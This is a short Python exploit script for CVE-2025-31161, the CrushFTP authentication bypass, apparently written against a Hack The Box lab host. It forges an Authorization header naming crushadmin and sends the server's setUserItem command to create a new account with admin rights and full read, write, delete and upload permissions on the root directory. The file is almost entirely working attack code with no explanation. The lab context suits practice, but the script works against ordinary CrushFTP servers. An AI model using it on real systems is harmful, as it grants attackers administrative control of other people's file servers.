import requests

url = "http://ftp.soulmate.htb:80/WebInterface/function/"
cookies = {"CrushAuth": "1743113839553_vD96EZ70ONL6xAd1DAJhXMZYMn1111"}
headers = {"Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/"}

c2f = cookies["CrushAuth"][-4:] # CrushAuth last 4 chars

username = 'user'; password = 'user'; 

payload = {
    "command": "setUserItem",
    "data_action": "replace",
    "serverGroup": "MainUsers",
    "username": username,
    "user": f'''<?xml version="1.0" encoding="UTF-8"?>
<user type="properties">
  <user_name>{username}</user_name>
  <password>{password}</password>
  <extra_vfs type="vector"></extra_vfs>
  <version>1.0</version>
  <root_dir>/</root_dir>
  <userVersion>6</userVersion>
  <max_logins>0</max_logins>
  <site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site>
  <created_by_username>crushadmin</created_by_username>
  <created_by_email></created_by_email>
  <created_time></created_time>
  <password_history></password_history>
  <admin>true</admin>
</user>''',
    "xmlItem": "user",
    "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
    "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(write)(view)(delete)(resume)(makedir)(deletedir)(rename)(upload)(admin)</item></VFS>',
    "c2f": c2f
}

print("\nCVE-2025-31161")

resp=requests.post(url, headers=headers, cookies=cookies, data=payload)

print(f"\nResponse\n===============================\n{resp.text}")

if "<response_status>OK</response_status>" in resp.text:
    print(f"[+] Created a new user {username}:{password}\n")
else:
    print("[-] Errors\n")
